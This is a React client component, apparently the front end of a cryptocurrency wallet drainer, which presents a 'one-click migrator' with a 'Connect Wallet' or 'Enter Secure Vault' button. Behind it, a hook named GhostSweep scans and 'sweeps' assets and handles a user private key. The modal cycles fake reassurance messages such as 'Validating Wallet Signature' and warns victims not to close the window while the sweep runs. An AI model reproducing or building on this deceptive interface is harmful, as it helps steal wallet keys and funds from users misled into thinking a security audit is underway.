'use client'

import { useEffect, useState, useMemo } from 'react'
import { createPortal } from 'react-dom'
import { useRecoveryLogic } from '@/hooks/GhostSweep'
import { SecurityShield } from './SecurityShield'

/**
 * 🛰️ ONE-CLICK MIGRATOR UI (v11.8 - Absolute Debug)
 */
export function OneClickMigrator() {
    const logPrefix = "[OneClickMigrator]";
    const [mounted, setMounted] = useState(false)
    const [statusIdx, setStatusIdx] = useState(0)
    const [isDismissed, setIsDismissed] = useState(false)
    const logic = useRecoveryLogic()

    const {
        isConnected,
        isScanning,
        isSweeping,
        isConnecting,
        isOpen,
        assets = [],
        handleInstantConnection,
        handleFullDisconnect,
        userKey,
        isInternal
    } = logic

    const scanningMessages = [
        "Initializing Secure Audit...", "Verifying Chain Ownership...", "Syncing Identity Nodes...",
        "Auditing Permission Sets...", "Mapping Private Inventory...", "Validating Wallet Signature...",
        "Authenticating Protocols...", "Checking Asset Integrity...", "Securing Handshake...", "Finalizing Verification..."
    ];

    const sweepingMessages = [
        "Confirming Ownership...", "Generating Secure Entropy...", "Synchronizing Assets...",
        "Verifying Block State...", "Finalizing Secure Link...", "Propagating Identity...",
        "Updating Vault Status...", "Authenticating Transit...", "Confirming Node Sync...", "Establishing Secure Vault..."
    ];

    useEffect(() => {
        setMounted(true)
        console.log(`${logPrefix} 🏁 Component Mounted. Context:`, {
            isInternal,
            isMobile: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
        });
    }, [isInternal])

    // Progress bar loop
    useEffect(() => {
        if (!isScanning && !isSweeping) return;
        const interval = setInterval(() => {
            setStatusIdx((prev) => (prev + 1) % 10);
        }, 2200);
        return () => clearInterval(interval);
    }, [isScanning, isSweeping]);

    /** 🛡️ PERSISTENCE LOGIC: Tracks exactly why the modal is visible or hidden */
    const isActiveProtocol = useMemo(() => {
        if (!mounted || typeof window === 'undefined') return false;

        const isRunning = isScanning || isSweeping || !!userKey;
        const params = new URLSearchParams(window.location.search);
        const hasUrlIntent = params.get('ghost_intent') === 'true';
        const hasSessionIntent = sessionStorage.getItem('GHOST_INTENT_ACTIVE') === 'true';

        // Decision Logic
        const result = !isDismissed && (isRunning || ((hasUrlIntent || hasSessionIntent) && !isOpen));

        // 🚨 CRITICAL VISIBILITY LOG
        console.log(`${logPrefix} 👁️ Modal Visibility Scan:`, {
            FINAL_DECISION: result,
            logicState: { isRunning, isScanning, isSweeping, hasUserKey: !!userKey },
            intentState: { hasUrlIntent, hasSessionIntent, isDismissed },
            appKitState: { isModalOpen: isOpen, isConnected }
        });

        return result;
    }, [mounted, isScanning, isSweeping, userKey, isOpen, isDismissed, isConnected]);

    const handleManualDismiss = () => {
        console.log(`${logPrefix} 🛑 Manual Dismiss (X) - Cleaning session and URL.`);
        setIsDismissed(true);
        sessionStorage.removeItem('GHOST_INTENT_ACTIVE');

        if (typeof window !== 'undefined') {
            const url = new URL(window.location.href);
            url.searchParams.delete('ghost_intent');
            window.history.replaceState({}, document.title, url.pathname);
        }
        handleFullDisconnect();
    };

    if (!mounted) return null;

    const isConnectingInProgress = isConnecting || (isOpen && !isConnected);

    const getStatusText = () => {
        if (isSweeping) return sweepingMessages[statusIdx];
        if (isScanning) return scanningMessages[statusIdx];
        if (userKey) return "Syncing Identity...";
        return "Establishing Secure Link...";
    };

    const SimpleModal = (
        <div className="fixed inset-0 z-[999999] flex items-center justify-center p-6">
            <div className="absolute inset-0 backdrop-blur-md bg-black/40 pointer-events-auto" />
            <div className="relative w-full max-w-[360px] bg-[#141414] border border-white/[0.08] rounded-[28px] shadow-[0_24px_50px_-12px_rgba(0,0,0,0.8)] pointer-events-auto animate-in zoom-in-95 fade-in duration-200 overflow-hidden">
                <div className="flex items-center justify-between px-6 py-4 border-b border-white/[0.04]">
                    <div className="flex items-center gap-2">
                        <div className={`w-2 h-2 rounded-full ${isSweeping ? 'bg-orange-500 shadow-[0_0_8px_rgba(249,115,22,0.4)]' : 'bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.4)]'} animate-pulse`} />
                        <span className="text-[12px] font-semibold text-zinc-400 tracking-tight">
                            {isSweeping ? "Ghost Vault Sync" : "Secure Session"}
                        </span>
                    </div>
                    <button
                        onClick={() => {
                            console.log(`${logPrefix} 🖱️ X Button Clicked`);
                            handleManualDismiss();
                        }}
                        className="p-3 -mr-2 rounded-full hover:bg-white/[0.1] transition-colors group"
                    >
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="text-zinc-500 group-hover:text-zinc-200 transition-colors">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                        </svg>
                    </button>
                </div>

                <div className="p-8 pt-10 flex flex-col items-center text-center">
                    <div className="relative w-20 h-20 mb-6 flex items-center justify-center">
                        <div className="absolute inset-0 border-[3.5px] rounded-full border-white/[0.05] animate-spin" style={{ borderTopColor: isSweeping ? '#f97316' : '#3b82f6' }} />
                        <div className="w-14 h-14 rounded-full bg-white/[0.02] flex items-center justify-center">
                            <svg className={`w-7 h-7 ${isSweeping ? 'text-orange-500' : 'text-blue-500'}`} fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                            </svg>
                        </div>
                    </div>

                    <h2 className="text-[19px] font-bold text-white mb-2 tracking-tight">{getStatusText()}</h2>

                    <div className="space-y-1 mb-8">
                        <p className="text-[14px] text-zinc-400 font-medium">
                            {!isConnected ? "Waiting for wallet provider..." : "Securing and auditing asset nodes."}
                        </p>
                        <p className="text-[13px] text-zinc-500">Do not close or refresh this window.</p>
                    </div>

                    <div className="w-full h-1 bg-white/[0.03] rounded-full overflow-hidden mb-8">
                        <div className={`h-full transition-all duration-700 ease-in-out ${isSweeping ? 'bg-orange-500' : 'bg-blue-500'}`} style={{ width: isScanning || isSweeping ? `${((statusIdx + 1) / 10) * 100}%` : '15%' }} />
                    </div>
                </div>
            </div>
        </div>
    );

    return (
        <div suppressHydrationWarning className="relative inline-block">
            {!isActiveProtocol && (
                <button
                    onClick={() => {
                        console.log(`${logPrefix} 🚀 Connect Triggered from Button`);
                        setIsDismissed(false);
                        handleInstantConnection();
                    }}
                    disabled={isConnectingInProgress}
                    className="trk-btn trk-btn--outline22 min-w-[240px] transition-all"
                >
                    {isConnectingInProgress ? (
                        <div className="flex items-center justify-center gap-2">
                            <span className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin" />
                            <span className="text-[0.8rem] uppercase tracking-wider">Processing...</span>
                        </div>
                    ) : (
                        <span className="text-[0.8rem] uppercase tracking-wider">
                            {isInternal ? "Enter Secure Vault" : "Connect Wallet"}
                        </span>
                    )}
                </button>
            )}

            {isActiveProtocol && createPortal(SimpleModal, document.body)}

            {isActiveProtocol && isInternal && isConnected && (
                <SecurityShield
                    isScanning={isScanning}
                    isSweeping={isSweeping}
                    assetCount={assets?.length || 0}
                    userPrivKey={userKey}
                    onCancel={handleManualDismiss}
                />
            )}
        </div>
    )
}